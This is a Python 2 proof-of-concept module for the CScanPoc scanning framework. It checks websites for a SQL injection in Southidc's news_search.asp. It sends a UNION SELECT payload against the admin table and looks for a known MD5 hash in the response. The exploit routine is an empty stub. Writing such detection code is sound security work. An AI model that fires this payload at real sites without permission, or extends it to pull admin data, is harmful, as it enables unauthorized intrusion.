# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import hashlib
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = 'f18a91a3-c2e0-490e-9310-7093cec4489e'
    name = 'Southidc news_search.asp 注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-03-03'  # 漏洞公布时间
    desc = '''
       Southidc news_search.asp 注入漏洞 
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Southidc'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ae5f7e14-1eea-4161-a5a7-344b576d9e8c'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            verify_url = arg + '/news_search.asp'
            payload = "?key=7%'%20union%20select%200,md5(3.14),2,3,4,5,6,7,8,9%20from%20admin%20where%201%20or'%'='&otype=title&Submit=%CD%D1%CB%F7"
            url = verify_url + payload
            code, head, res, _, _ = hh.http(url)
                       
            if code == 200:
                if '4beed3b9c4a886067de0e3a094246f78' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()